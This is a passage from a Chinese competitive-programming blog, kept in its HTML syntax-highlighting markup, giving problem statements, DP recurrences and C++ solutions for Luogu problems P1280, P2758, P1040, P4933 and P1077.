punctuation">;</span>    <span class="token keyword">int</span> u <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            source<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>it<span class="token operator">:</span>source<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        res <span class="token operator">+=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">%=</span> mod<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="线性状态动态规划"><a href="#线性状态动态规划" class="headerlink" title="线性状态动态规划"></a><a href="https://www.luogu.com.cn/training/212#problems">线性状态动态规划</a></h3><h4 id="P1280-尼克的任务"><a href="#P1280-尼克的任务" class="headerlink" title="P1280 尼克的任务"></a><a href="https://www.luogu.com.cn/problem/P1280">P1280 尼克的任务</a></h4><ul><li><p>题意：<br>尼克的一个工作日为 n 分钟，从第 1 分钟开始到第 n 分钟结束。当尼克到达单位后他就开始干活，公司一共有 k 个任务需要完成。如果在同一时刻有多个任务需要完成，尼克可以任选其中的一个来做，而其余的则由他的同事完成，反之如果只有一个任务，则该任务必需由尼克去完成，假如某些任务开始时刻尼克正在工作，则这些任务也由尼克的同事完成。问尼克的最大空闲时间为多少。</p></li><li><p>题解:<br>规定$dp[i]$为从第$i$分钟开始，最大的空闲时间。那么就可以有转移方程</p></li></ul><script type="math/tex; mode=display">dp(i)=\left\{\begin{aligned}&dp[i+1]+1,当前时刻没有任务开始\\&max(dp[i],dp[i+task[i][j]]),当前时刻有任务开始，且任务的长度为task[i][j]\\\end{aligned}\right.</script><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> dp<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> task<span class="token punctuation">[</span><span class="token number">10001</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k<span class="token punctuation">;</span>    dp<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ux<span class="token punctuation">,</span> uy<span class="token punctuation">;</span>        cin <span class="token operator">>></span> ux <span class="token operator">>></span> uy<span class="token punctuation">;</span>        task<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>uy<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>task<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> task<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> task<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2758-编辑距离"><a href="#P2758-编辑距离" class="headerlink" title="P2758 编辑距离"></a><a href="https://www.luogu.com.cn/problem/P2758">P2758 编辑距离</a></h4><ul><li><p>题意：<br>给定两个字符串，要用最少的字符操作次数，将字符串A转换为字符串B。有三种操作方式，分别是删除，插入和替换。</p></li><li><p>题解:<br>定义$dp[i][j]$表示将A字符串的$0 -  i$ 的字符串变换到和B字符串的$0 - j$相同的最少字符操作次数。</p></li></ul><script type="math/tex; mode=display">dp[i][j]=\left\{\begin{aligned}&dp[i-1][j-1],s[i-1]==t[j-1]\\&min(dp[i-1][j-1],dp[i][j-1]),dp[i-1][j])+1,s[i-1]\not ={t[j-1]}\\\end{aligned}\right.</script><pre class="language-cpp" data-language="cpp"><code class="language-cpp">string s<span class="token punctuation">,</span> t<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">2003</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">2003</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> s <span class="token operator">>></span> t<span class="token punctuation">;</span>    <span class="token keyword">int</span> ls <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lt <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">+=</span> <span class="token string">" "</span><span class="token punctuation">,</span> t <span class="token operator">+=</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> ls<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> lt<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> ls<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> lt<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> t<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">,</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span>ls<span class="token punctuation">]</span><span class="token punctuation">[</span>lt<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1040-加分二叉树"><a href="#P1040-加分二叉树" class="headerlink" title="P1040 加分二叉树"></a><a href="https://www.luogu.com.cn/problem/P1040">P1040 加分二叉树</a></h4><ul><li><p>题意：<br>设定一个节点数为n的二叉树，每个节点都有权值，并且二叉树的中序遍历为$1,2,3,…,n$，tree 及它的每个子树都有一个加分，任一棵子树 加分计算方法为: 左子树的加分 * 右子树的加分 + 本身的分数。若某个子树为空，规定其加分为 1，叶子的加分就是叶节点本身的分数。不考虑它的空子树。</p></li><li><p>题解:<br>在中序遍历这个序列上，某个点左边的序列一定是这个点的左子树，右边的序列，一定在这个点的右子树。<br>定义$dp[i][j]$表示从节点i到节点j的最大分数，枚举i到J的根节点K，动态更新即可。<br>转移方程：</p><p>  $dp[i][j] = max(dp[i][k-1]*dp[k+1][j]+value[k],dp[i][j])$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">>></span> <span class="token function">rt</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> st<span class="token punctuation">,</span><span class="token keyword">int</span> ed<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>st<span class="token operator">==</span>ed<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> st <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rt<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>ed<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> rt<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>ed<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>st<span class="token punctuation">,</span> rt<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>ed<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>rt<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>ed<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> ed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> j<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    rt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P4933-大师"><a href="#P4933-大师" class="headerlink" title="P4933 大师"></a><a href="https://www.luogu.com.cn/problem/P4933">P4933 大师</a></h4><ul><li><p>题意：<br>给定一串序列，求子序列中为等差数列的个数。</p></li><li><p>题解:<br>动态规划，$dp[i][j]$ 表示到以第i个元素为结尾，公差为j的序列的个数。转移方程:</p><p>  $dp[i][value[i]-value[j]] += dp[j][value[i]-value[j]]+1$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">1005</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">40005</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>ll<span class="token operator">></span> value<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    value<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ll res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">20002</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>p <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> value<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>p <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> value<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>p <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> value<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>            res <span class="token operator">+=</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>p <span class="token operator">+</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> value<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            res <span class="token operator">%=</span> mod<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">+</span> n <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1077-摆花"><a href="#P1077-摆花" class="headerlink" title="P1077 摆花"></a><a href="https://www.luogu.com.cn/problem/P1077">P1077 摆花</a></h4><ul><li><p>题意：<br>有n个物品，每个物品有$a[i]$个，按顺序摆放m个，求摆放的种类的数量。</p></li><li><p>题解:<br>动态规划，$dp[i][j]$ 表示到第i个元素，放了j个物品的摆放种类，枚举j即可。</p><p>  $dp[i][j+k] += dp[i-1][k]$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> vec<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> vec<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">+</span> j <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token 